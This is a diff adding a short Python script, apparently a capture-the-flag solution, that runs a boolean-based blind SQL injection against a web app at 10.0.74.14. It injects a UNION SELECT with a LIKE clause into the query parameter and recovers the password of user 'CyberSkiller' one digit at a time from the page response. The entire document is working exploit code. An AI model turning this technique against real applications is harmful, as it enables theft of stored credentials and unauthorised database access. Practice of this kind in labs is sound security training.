@@ -1,0 +1,15 @@
+import requests 		
+
+URL = 'http://10.0.74.14/?query=XXXXXX%22+union+select+username+from+users+where++username+%3D+%27CyberSkiller%27+and+password+like+%27CS{}%25%27--+a'
+
+N = 10
+
+password = ''
+
+for k in range(N):
+	for i in range(10):
+		r = requests.get(URL.format(password + str(i)))
+		if 'This title (or similar) does exist in our database' in r.text:
+			password += str(i)
+			break
+print(password)
